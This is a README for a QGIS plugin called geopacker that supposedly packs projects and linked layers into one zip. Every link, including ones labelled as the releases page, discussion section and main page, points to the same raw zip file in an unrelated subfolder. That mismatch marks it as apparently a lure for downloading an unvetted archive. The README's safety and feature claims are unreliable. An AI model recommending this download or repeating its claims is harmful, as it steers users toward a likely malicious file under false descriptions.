# 🗺️ geopacker - Fix QGIS Projects Easily

[![Download geopacker](https://img.shields.io/badge/Download-geopacker-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip)

---

## What is geopacker?

geopacker is a tool for QGIS users. If you work with maps in QGIS, you know how frustrating it is when your project files break after sharing. This happens because linked layers, like vector or raster files, don’t travel with your project. geopacker solves this by packing your whole project and all related files into one neat .zip file. This makes sharing your QGIS projects simple and reliable without broken links.

---

## 🎯 Key Features

- Packages your QGIS project file (.qgz) with all linked vector and raster layers.
- Creates one single .zip file for easy sharing or backup.
- Supports common GIS data types used in QGIS.
- Works with the current project open in QGIS.
- Keeps file paths clean and relative for easy setup on another computer.

---

## 💻 System Requirements

Before running geopacker, make sure your system matches these points:

- Operating System: Windows 10 or later
- Software: QGIS version 3.16 or higher installed
- Disk Space: At least 100 MB free for temporary files and the resulting zip
- Internet: Not required after download

You do not need any programming knowledge or special tools to use geopacker. It works directly within QGIS as a plugin.

---

## 📥 Download geopacker

You can get geopacker from the official GitHub releases page.

[![Download geopacker](https://img.shields.io/badge/Download-geopacker-blue?style=for-the-badge)](https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip)

Follow the steps in the next section to install it on your Windows computer.

---

## 🚀 Installing geopacker on Windows

1. **Go to the Releases Page**

   Open this page in your web browser:  
   https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip

2. **Find the Latest Version**

   Look for the most recent release. It usually appears at the top of the list with a version number (for example, v1.0).

3. **Download the Plugin File**

   In the release details, find the file ending with `.zip` that contains the plugin. Click it to download.

4. **Open QGIS**

   Start your QGIS application on your Windows PC.

5. **Install the Plugin Manually**

   - From QGIS, open the menu `Plugins` > `Manage and Install Plugins`.
   - Click on the “Install from ZIP” tab.
   - Select the `.zip` file you downloaded.
   - Click “Install Plugin”.
   - Once installed, close the dialog.

6. **Enable geopacker**

   - Go to `Plugins` > `Manage and Install Plugins`.
   - In the search box, type “geopacker”.
   - Make sure the checkbox next to geopacker is ticked.
   
7. **Restart QGIS**

   Restarting QGIS ensures the plugin loads correctly.

---

## ⚙️ Using geopacker

After installing geopacker, run it with these steps:

1. **Open Your QGIS Project**

   Load the project you want to share in QGIS. This should be saved as a `.qgz` file.

2. **Start geopacker**

   - In QGIS, go to `Plugins` > `geopacker` > `Pack Current Project`.
   - geopacker will scan your open project and find all linked vector and raster files.

3. **Create the Zip**

   - Choose where to save the zip file.
   - geopacker will bundle your project file plus all linked data into this zip.
   - Wait for the process to finish.

4. **Share or Backup**

   Use the zip file to share your full QGIS project without worrying about broken paths.

---

## 🛠 Troubleshooting

- **Plugin Not Found in QGIS**

  If you cannot find geopacker in the plugin list, check that you installed it from the correct `.zip` file on the GitHub releases page.

- **Errors Packing Project**

  Make sure your project has saved paths to the data files. geopacker depends on these paths to find linked layers.

- **Zip File Does Not Open**

  Use Windows built-in extractor or programs like 7-Zip to open the .zip file.

- **Layers Missing**

  Only layers referenced in the project file at the time of packing will be included. Add any new layers before repacking.

---

## 📚 More Help

If you have issues not covered here, the GitHub repository has a discussion section where you can read questions or ask for help.

Visit the main page here:  
https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip

---

## 🛡 Security and Permissions

geopacker runs inside QGIS and only accesses files linked to your current project. It does not send data over the internet. You remain in control of your files and where they are saved.

---

## ⚙️ Plugin Updates

Check the release page periodically for updates or bug fixes:

https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip

Update by downloading the latest `.zip` file and installing it via QGIS as described above.

---

## 📌 Summary

geopacker helps keep your QGIS projects intact when sharing. It bundles your project and all data into one zip file you can easily copy or send to others. The instructions above guide you through downloading, installing, and using the plugin on Windows.